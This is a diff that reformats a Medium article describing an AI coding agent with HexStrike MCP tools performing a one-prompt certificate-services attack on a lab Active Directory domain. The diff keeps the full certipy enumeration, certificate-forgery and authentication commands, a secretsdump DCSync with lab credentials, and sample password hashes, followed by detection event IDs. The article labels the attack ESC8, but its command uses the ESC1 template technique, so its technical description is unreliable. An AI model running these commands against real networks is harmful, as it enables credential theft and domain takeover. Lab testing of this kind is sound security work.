@@ -13,7 +13,7 @@ One-Prompt Domain Compromise
 
 #### One-Prompt Domain Compromise
 
-![](https://cdn-images-1.medium.com/max/800/1*npVtspHqp4Ac88UEt_5ziQ.png)
+![](/img/hexstrike-articles/cursor-hexstrike-fully-automated-adcs-esc8-attack/1-npVtspHqp4Ac88UEt_5ziQ.png)
 
 ### Abstract
 
@@ -23,7 +23,7 @@ This article documents a **fully automated, single-prompt penetration test** tha
 
 * * *
 
-#### If you like this research, [buy me a coffee (PayPal) — Keep the lab running](https://www.paypal.com/donate/?business=W3XDKS7J9XTCG&no_recurring=0&item_name=Buy+me+a+coffee+%28PayPal%29+%E2%80%94+Keep+the+lab+running&currency_code=USD)
+#### If you like this research, [buy me a coffee (PayPal) — Keep the lab running](<https://www.paypal.com/donate/?business=W3XDKS7J9XTCG&no_recurring=0&item_name=Buy+me+a+coffee+%28PayPal%29+%E2%80%94+Keep+the+lab+running&currency_code=USD>)
 
 * * *
 
@@ -55,7 +55,8 @@ Traditional penetration testing requires manual intervention at each step: runni
 
 
 ### Attack Chain
-[code]
+    
+    
     IP Address (192.168.56.10)  
         ↓  
     [Phase 1] Reconnaissance  
@@ -93,18 +94,17 @@ Traditional penetration testing requires manual intervention at each step: runni
         ├─ Generate Comprehensive Report  
         ├─ Document All Artifacts  
         └─ Create Proof of Compromise
-[/code]
 
 * * *
 
 ### The One-Prompt Approach
 
 #### The Prompt
-[code]
+    
+    
     Perform a fully automated blackbox penetration test starting from IP address 192.168.56.10.   
     Execute the complete ADCS ESC8 attack chain to achieve domain compromise. Use HexStrike MCP   
     tools and handle all troubleshooting automatically.
-[/code]
 
 ### Why This Works
 
@@ -201,10 +201,10 @@ Traditional penetration testing requires manual intervention at each step: runni
 
 
 **Enumeration Commands:**
-[code]
+    
+    
      certipy find -u TestUser@sevenkingdoms.local -p 'Password123!' \  
       -dc-ip 192.168.56.10
-[/code]
 
 **Key Findings:**
 
@@ -236,14 +236,14 @@ Traditional penetration testing requires manual intervention at each step: runni
 
 
 **Attack Command:**
-[code]
+    
+    
      certipy req -u TestUser@sevenkingdoms.local -p 'Password123!' \  
       -target http://192.168.56.10 \  
       -ca SEVENKINGDOMS-CA \  
       -template ESC1 \  
       -upn Administrator@sevenkingdoms.local \  
       -out administrator.pfx
-[/code]
 
 **Results:**
 
@@ -274,9 +274,9 @@ Traditional penetration testing requires manual intervention at each step: runni
 
 
 **Attack Command:**
-[code]
+    
+    
      certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
-[/code]
 
 **Results:**
 
@@ -307,10 +307,10 @@ Traditional penetration testing requires manual intervention at each step: runni
 
 
 **Attack Command:**
-[code]
+    
+    
      export KRB5CCNAME=administrator.ccache  
     secretsdump.py -k -no-pass Administrator@sevenkingdoms.local@192.168.56.10
-[/code]
 
 **Results:**
 
@@ -321,11 +321,11 @@ Traditional penetration testing requires manual intervention at each step: runni
 
 
 **Sample Hashes:**
-[code]
+    
+    
      Administrator:500:aad3b435b51404eeaad3b435b51404ee:c66d72021a2d4744409969a581a1705e:::  
     krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dCT-DJjgScp...:::  
     TestUser:1001:aad3b435b51404eeaad3b435b51404ee:...:::
-[/code]
 
 **Automation Features:**
 
@@ -507,12 +507,12 @@ Every action is logged:
 ### Detection Queries
 
 **Windows Event Log:**
-[code]
+    
+    
      Event ID 4886 - Certificate Request  
     Event ID 4887 - Certificate Request Disposition  
     Event ID 4624 - Successful Logon (PKINIT)  
     Event ID 4662 - DCSync Operation
-[/code]
 
 **SIEM Queries:**
 
@@ -546,18 +546,18 @@ This fully automated ADCS ESC8 attack demonstrates:
 
 ### References
 
-  * [Certified Pre-Owned Research](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) — SpecterOps
-  * [ADCS ESC8 Vulnerability](https://github.com/ly4k/Certipy) — Certipy Documentation
-  * [GOAD Lab Environment](https://github.com/Orange-Cyberdefense/GOAD) — Game of Active Directory
+  * [Certified Pre-Owned Research](<https://specterops.io/assets/resources/Certified_Pre-Owned.pdf>) — SpecterOps
+  * [ADCS ESC8 Vulnerability](<https://github.com/ly4k/Certipy>) — Certipy Documentation
+  * [GOAD Lab Environment](<https://github.com/Orange-Cyberdefense/GOAD>) — Game of Active Directory
 
 
 
 **Andrey Pautov**
 
-### If you like this research, [buy me a coffee (PayPal) — Keep the lab running](https://www.paypal.com/donate/?business=W3XDKS7J9XTCG&no_recurring=0&item_name=Buy+me+a+coffee+%28PayPal%29+%E2%80%94+Keep+the+lab+running&currency_code=USD)
+### If you like this research, [buy me a coffee (PayPal) — Keep the lab running](<https://www.paypal.com/donate/?business=W3XDKS7J9XTCG&no_recurring=0&item_name=Buy+me+a+coffee+%28PayPal%29+%E2%80%94+Keep+the+lab+running&currency_code=USD>)
 
-By [Andrey Pautov](https://medium.com/@1200km) on [January 29, 2026](https://medium.com/p/8736fec53c58).
+By [Andrey Pautov](<https://medium.com/@1200km>) on [January 29, 2026](<https://medium.com/p/8736fec53c58>).
 
-[Canonical link](https://medium.com/@1200km/cursor-hexstrike-fully-automated-adcs-esc8-attack-8736fec53c58)
+[Canonical link](<https://medium.com/@1200km/cursor-hexstrike-fully-automated-adcs-esc8-attack-8736fec53c58>)
 
-Exported from [Medium](https://medium.com) on May 15, 2026.
+Exported from [Medium](<https://medium.com>) on May 15, 2026.
